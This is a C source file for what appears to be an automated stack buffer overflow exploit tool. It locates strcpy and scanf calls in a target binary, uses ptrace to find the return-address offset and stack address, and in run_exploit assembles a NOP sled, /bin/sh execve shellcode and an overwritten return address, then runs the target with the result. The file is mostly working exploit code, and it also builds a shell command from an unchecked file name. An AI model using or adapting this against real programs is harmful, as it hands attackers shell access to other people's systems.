#include "debugger.h"

#define VULN_FUNCTIONS_COUNT 2
#define MAX_BREAKPOINTS 100
#define OBJDUMP_ADDRESS_OFFSET 4
#define OBJDUMP_INSTRUCTION_OFFSET 10

static const char VULN_FUNCTIONS[VULN_FUNCTIONS_COUNT][20] = {
        "strcpy",
        "scanf"
};

typedef struct {
    int offset;
    int instruction;
    int is_active;
} Breakpoint;

typedef struct {
    char copy_filename[MAX_FILENAME];
    Breakpoint breakpoints[MAX_BREAKPOINTS];
    int breakpoint_count;
} Debugger;

static Debugger *debugger;

void debugger_init() {
    info("Initializing debugger");
    debugger = malloc(sizeof(Debugger));
    debugger->breakpoint_count = 0;
    strncpy(debugger->copy_filename, commonData->target_program_file_name, MAX_FILENAME);
    strncat(debugger->copy_filename, ".dbg", MAX_FILENAME);
    char copy_command[MAX_COMMAND] = "cp ";
    strncat(copy_command, commonData->target_program_file_name, MAX_COMMAND);
    strncat(copy_command, " ", MAX_COMMAND);
    strncat(copy_command, debugger->copy_filename, MAX_COMMAND);
    info("Creating a copy of target program");
    if (system(copy_command)) {
        error_exit(E_FAILED_COPY_TARGET_PROGRAM);
    }
    info("Debugger initialized");
}

void toggle_breakpoint(Breakpoint *breakpoint) {
    breakpoint->is_active = !breakpoint->is_active;
    info("%s breakpoint at 0x%x", (breakpoint->is_active ? "Enabling" : "Disabling"), breakpoint->offset);
    FILE *file = NULL;
    file = fopen(debugger->copy_filename, "rb+");
    if (!file) error_exit(E_FAILED_OPEN_TARGET_FILE_COPY);
    fseek(file, breakpoint->offset, SEEK_SET);
    int data = (breakpoint->is_active ? 0xcc : breakpoint->instruction);
    fwrite(&data, 2, 1, file);
    fclose(file);
}

void enable_breakpoint(Breakpoint *breakpoint) {
    if (breakpoint->is_active) return;
    toggle_breakpoint(breakpoint);
}

void disable_breakpoint(Breakpoint *breakpoint) {
    if (!breakpoint->is_active) return;
    toggle_breakpoint(breakpoint);
}

void set_all_breakpoints_state(int state) {
    info("Turning %s all breakpoints", (state ? "on" : "off"));
    for (int i = 0; i < debugger->breakpoint_count; i++) {
        (state) ? enable_breakpoint(&debugger->breakpoints[i]) : disable_breakpoint(&debugger->breakpoints[i]);
    }
}

void debugger_find_vulnerable_functions() {
    info("Looking for vulnerable functions");
    FILE *fp;
    char cmd[256];
    char output[1024];
    char *ptr;
    char *strtok_ptr;
    const char *delim = " \t\n";
    char *token;
    int offset = 0;
    int found_functions = 0;

    int should_add_breakpoint = 0;
    int breakpoint_instruction = 0;

    snprintf(cmd, sizeof(cmd), "objdump -d %s", debugger->copy_filename);

    // Call objdump and read its output
    fp = popen(cmd, "r");
    if (!fp) {
        error_exit(E_OBJDUMP_FAILED);
    }

    while (fgets(output, sizeof(output), fp)) {
        if (should_add_breakpoint) {
            int b_offset = (int) strtol(output + OBJDUMP_ADDRESS_OFFSET, NULL, 16);
            char instruction[3] = "";
            strncpy(instruction, output + OBJDUMP_INSTRUCTION_OFFSET, 2);
            breakpoint_instruction = (int) strtol(instruction, NULL, 16);
            info("Adding breakpoint at 0x%x", b_offset);
            Breakpoint breakpoint = {b_offset, breakpoint_instruction, 0};
            debugger->breakpoints[found_functions++] = breakpoint;
            should_add_breakpoint = 0;
        }
        for (int i = 0; i < VULN_FUNCTIONS_COUNT; i++) {
            ptr = strstr(output, "call");
            if (!ptr) continue;
            ptr = strstr(output, VULN_FUNCTIONS[i]);
            if (!ptr) continue;
            token = strtok_r(ptr, delim, &strtok_ptr);
            if (token) {
                offset = (int) strtol(output + OBJDUMP_ADDRESS_OFFSET, NULL, 16);
                info("Found %s at offset 0x%x", VULN_FUNCTIONS[i], offset);
                should_add_breakpoint = 1;
            }
        }
    }
    pclose(fp);

    debugger->breakpoint_count = found_functions;

    if (!found_functions) error_exit(E_NO_VULN_FUNCTIONS);
    info("Unsafe function calls found: %d", found_functions);
}

void find_buffer_size() {
    info("Calculating buffer size");
    commonData->buffer_size = 0;
    char payload[MAX_PAYLOAD] = "";
    do {
        sprintf(payload + commonData->buffer_size++, "%s", "A");
        if (commonData->buffer_size >= MAX_PAYLOAD) error_exit(E_MAX_PAYLOAD);
    } while (execute_program(payload) == 0);
    info("Buffer size: %d", commonData->buffer_size);
}

int execute_program(char *payload) {
    switch (commonData->input_method) {
        case ARGS: {
            char cmd[MAX_COMMAND + MAX_PAYLOAD] = "";
            char *argv[] = {commonData->target_program_file_name, payload, NULL};
            execv(commonData->target_program_file_name, argv);
//            sprintf(cmd, "./%s %s", debugger->copy_filename, payload);
//            int n = system(cmd);
//            return n;
            break;
        }
        case STDIN:
            error_exit(E_STDIN_INPUT_METHOD);
            break;
    }
    return -1;
}

pid_t start_debug(char *payload) {
    info("Starting a new process with debugger");
    char *filename = debugger->copy_filename;
    pid_t child_pid;
    char *args[] = {filename, payload, NULL};
    child_pid = fork();
    if (child_pid == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execv(filename, args);
    } else {
        return child_pid;
    }
    return -1;
}

void stop_debug(pid_t child_pid) {
    info("Killing child process");
    ptrace(PTRACE_DETACH, child_pid, NULL, NULL);
    kill(child_pid, SIGTERM);
    info("Waiting for process to exit");
    sleep(1);
}

void find_eip_offset() {
    info("Looking for eip offset");
    int status;
    struct user_regs_struct regs;
    pid_t child_pid = start_debug(OVERFLOW_PATTERN);
    if (child_pid < 0) error_exit(E_FAILED_START_DEBUGGER);

    waitpid(child_pid, &status, 0);
    ptrace(PTRACE_CONT, child_pid, NULL, NULL);

    waitpid(child_pid, &status, 0);

    ptrace(PTRACE_GETREGS, child_pid, NULL, &regs);
    info("EIP: 0x%lx", regs.eip);
    info("ESP: 0x%lx", regs.esp);
    char eip[5];
    sprintf(eip, "%c%c%c%c", (char) regs.eip, (char) (regs.eip >> 8), (char) (regs.eip >> 16),
            (char) (regs.eip >> 24));
    commonData->eip_offset = strstr(OVERFLOW_PATTERN, eip) - OVERFLOW_PATTERN;
    if (commonData->eip_offset <= 0) error_exit(E_INVALID_EIP_OFFSET);
    commonData->buffer_address = regs.esp;
    info("EIP offset: %d", commonData->eip_offset);
    stop_debug(child_pid);
}

void find_buffer_address() {
    info("Looking for buffer address");
    set_all_breakpoints_state(1);

    pid_t child_pid = start_debug(BUFFER_PATTERN);
    int status;
    struct user_regs_struct regs;

    char proc_memory_file[MAX_FILENAME];
    sprintf(proc_memory_file, "/proc/%ld/mem", (long) child_pid);

    waitpid(child_pid, &status, 0);
    ptrace(PTRACE_CONT, child_pid, NULL, NULL);
    waitpid(child_pid, &status, 0);
    ptrace(PTRACE_GETREGS, child_pid, NULL, &regs);
    off_t stack_addr = regs.esp;
    sleep(1);
    int fd = open(proc_memory_file, O_RDONLY);
    char data[500];
    lseek(fd, stack_addr, SEEK_SET);
    read(fd, data, sizeof(data));
    info("Stack address (ESP): 0x%x", stack_addr);

    close(fd);
    stop_debug(child_pid);
    set_all_breakpoints_state(0);
}

void run_exploit() {
    char payload[MAX_PAYLOAD] = "";
    for (int i = 0; i < commonData->eip_offset - NOP_SLOPE_OFFSET; i++) {
        sprintf(payload + i, "\x90");
    }
    char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
    strcat(payload,shellcode);
    int l = strlen(payload);
    for (int i = 0; i < commonData->eip_offset - (commonData->eip_offset - NOP_SLOPE_OFFSET) - strlen(shellcode); i++) {
        sprintf(payload + i + l, "\x90");
    }
    char addr[5] = "";
    sprintf(addr, "%c%c%c%c", (char) commonData->buffer_address, (char) (commonData->buffer_address >> 8),
            (char) (commonData->buffer_address >> 16),
            (char) (commonData->buffer_address >> 24));
    strcat(payload, addr);
    info("Payload len: %d", strlen(payload));
    execute_program(payload);
}
